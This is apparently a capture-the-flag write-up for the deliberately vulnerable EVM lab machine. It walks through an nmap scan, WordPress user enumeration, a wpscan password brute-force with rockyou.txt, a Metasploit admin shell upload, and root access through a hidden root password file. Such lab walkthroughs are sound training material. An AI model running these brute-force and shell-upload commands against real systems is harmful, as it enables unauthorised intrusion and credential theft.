---
layout: default
title : muzec - EVM Writeup
---

![image](https://user-images.githubusercontent.com/69868171/117515856-77b76f00-af65-11eb-9a1b-41753c58c175.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Fri May  7 14:10:03 2021 as: nmap -p- -sC -sV -oA nmap 172.16.139.171
Nmap scan report for 172.16.139.171
Host is up (0.00029s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)
|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)
|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)
53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL PIPELINING CAPA TOP AUTH-RESP-CODE RESP-CODES UIDL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: OK IMAP4rev1 ENABLE have more capabilities LOGINDISABLEDA0001 LITERAL+ listed SASL-IR LOGIN-REFERRALS post-login IDLE ID Pre-login
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h20m08s, deviation: 2h18m34s, median: 3h00m07s
|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00
|   Domain name: \x00
|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
|_  System time: 2021-05-07T17:10:26-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-07T21:10:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May  7 14:10:26 2021 -- 1 IP address (1 host up) scanned in 22.48 seconds
```

First of all i check SMB but it was empty.

![image](https://user-images.githubusercontent.com/69868171/117516189-6b7fe180-af66-11eb-86f0-e79b05db37fa.png)

So i decided to burst some directory.

![image](https://user-images.githubusercontent.com/69868171/117516299-bb5ea880-af66-11eb-96df-65aca0e54805.png)

Ok it a wordpress website let use wpscan to enumerate it first thing first is to find all active users on it.

`wpscan --url http://172.16.139.171/wordpress/ --enumerate u`

![image](https://user-images.githubusercontent.com/69868171/117516605-93237980-af67-11eb-80c3-a126146e3a0f.png)

Ok just one user `c0rrupt3d_brain` let try to brute force it now.

`wpscan --url http://172.16.139.171/wordpress/ --usernames c0rrupt3d_brain --passwords /usr/share/wordlists/rockyou.txt`

![image](https://user-images.githubusercontent.com/69868171/117516980-aa169b80-af68-11eb-9406-14969a1b5f2b.png)

And we have the right credentials now let use the metasploit module for wordpress to upload our shell since the wordpress page is not loading.

`use exploit/unix/webapp/wp_admin_shell_upload`

![image](https://user-images.githubusercontent.com/69868171/117517129-02e63400-af69-11eb-9354-6c2b34c58d3f.png)

Now let hit the exploit.

![image](https://user-images.githubusercontent.com/69868171/117517195-35902c80-af69-11eb-9e7b-1b6e64a8ab81.png)

And we have shell now let drop out of the meterpreter shell with `shell` .

![image](https://user-images.githubusercontent.com/69868171/117517239-68d2bb80-af69-11eb-8ccc-c2a0c243b70e.png)

We also spawn a TTY shell and we are good to go.

### Privilege Escalation

![image](https://user-images.githubusercontent.com/69868171/117517302-a33c5880-af69-11eb-9f09-4e22d3f6dc34.png)

Going to the home with the folder of the user `root3r` with found aa root password for ssh lucky us and NOte:- it was hidden but using the command `ls -la` shows hidden file.

![image](https://user-images.githubusercontent.com/69868171/117517442-0d54fd80-af6a-11eb-8bcc-91f799abc4c8.png)

Now let log in with the root credentials.

![image](https://user-images.githubusercontent.com/69868171/117517561-59a03d80-af6a-11eb-8fe3-e28a10976dbd.png)

We are root and we have the proof.txt so we are done for today.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>

